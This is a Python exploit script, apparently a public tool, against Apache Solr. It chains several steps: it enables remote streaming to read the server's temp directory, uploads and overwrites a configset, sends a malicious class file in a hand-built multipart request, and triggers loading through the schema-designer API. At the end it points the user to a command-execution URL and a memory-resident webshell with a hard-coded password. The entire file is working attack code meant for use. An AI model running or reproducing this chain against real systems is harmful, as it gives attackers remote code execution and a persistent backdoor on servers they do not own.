# -*- coding: utf-8 -*-
import requests
import sys
import json
import re

from pwn import *

proxy = {"http":"http://127.0.0.1:8080"}
def overwrite_operate(host,port,strs):
    url = "http://" + host + ":" + port + "/solr/admin/configs?action=UPLOAD&name=exp&filePath=solrconfig.xml&overwrite=true"
    headers = {"Content-Type":"application/octet-stream"}
    with open("solrconfig.xml", 'rb') as f:
        file_content = f.read()
    data = file_content.replace(b"/tmp",bytes(strs,encoding='utf-8'))
    response = requests.post(url, headers=headers, data=data)
    print(response.status_code)
def create_configset(host,port):
    file_path = "_default.zip"
    url = "http://" + host + ":" + port + "/solr/admin/configs?action=UPLOAD&name=exp&overwrite=true"
    headers = {"Content-Type":"application/octet-stream"}
    with open(file_path, 'rb') as f:
        file_content = f.read()
    response = requests.post(url, headers=headers, data=file_content)
    print(response.status_code)
def open_ssrf(host,port):
    url_0 = "http://" + host + ":" + port + "/solr/admin/cores?indexInfo=false&wt=json"
    rep = requests.get(url=url_0)
    replic = json.loads(rep.text)
    name = list(replic['status'].keys())[-1]
    # print(name)

    url = "http://" + host + ":" + port + "/solr/"+ name +"/config"
    data = {"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":True}}
    headers = {'Content-Type': 'application/json'}
    r = requests.post(url=url,headers=headers,json=data,proxies=proxy)
    print(r.status_code)
    url_1 = "http://" + host + ":" + port + "/solr/"+name+"/debug/dump?param=ContentStreams"
    files = {"stream.url":(None,"file:/tmp")}
    r1 = requests.post(url=url_1,files=files,proxies=proxy)
    # print(r1.text)
    dir = re.findall(r"jetty-[0-9_\-a-z]+[0-9]+",r1.text)
    # print(dir)
    return dir

def cache(host,port):
    l = remote(host,int(port))

    files = open("poc.zip","rb")
    datas = files.read()

    b= b'''-----------------------------254533494626224024183205869709\r
Content-Disposition: form-data; name="File"; filename="poc.class"\r
Content-Type: image/jpg\r
\r
%s
-----------------------------254533494626224024183205869709--\r'''% datas
    length = len(b)+11

    a = b'''POST /api/ HTTP/1.1\r
Host: %s:%s\r
Content-Type: multipart/form-data; boundary=---------------------------254533494626224024183205869709\r
Content-Length: %d\r
\r
%s'''% (bytes(host,encoding='utf-8'),bytes(port,encoding='utf-8'),length,b)
    l.send(a)
    # time.sleep(10)
    l.close()

def trigger(host,port):
    import random
    name = random.randint(0,99999)
    url = "http://" + host + ":" + port + "/api/schema-designer/prep?_=1681900717123&configSet="+str(name)+"&copyFrom=exp&wt=json"
    r = requests.post(url=url)
    # print(r.status_code)
def banner():
    print('''
  ___      _     ___          _     _ _   
 / __| ___| |_ _| __|_ ___ __| |___(_) |_ 
 \__ \/ _ \ | '_| _|\ \ / '_ \ / _ \ |  _|
 |___/\___/_|_| |___/_\_\ .__/_\___/_|\__|
                        |_|               
                            - by Pupi1
                        ''')
    
def main(host,port):
    
    dir = open_ssrf(host=host,port=port)
    strs = "/tmp/" + dir[0]
    create_configset(host=host,port=port)
    overwrite_operate(host=host,port=port,strs=strs)
    cache(host=host,port=port)
    trigger(host=host,port=port)
    print("please check "+"http://" + host + ":" + port+"/solr/aaa?type=basic&cmd=whoami ")
    print("Please bring the request header X-Options-Ai to access Behind memshell "+"http://" + host + ":" + port+"/solr/aaa password is rebeyond")

if __name__ == '__main__':
    banner()
    if len(sys.argv) != 3:
        print("eg: python3 exp.py 127.0.0.1 8983")
    else:
        host = sys.argv[1]
        port = sys.argv[2]
        main(host,port)
   


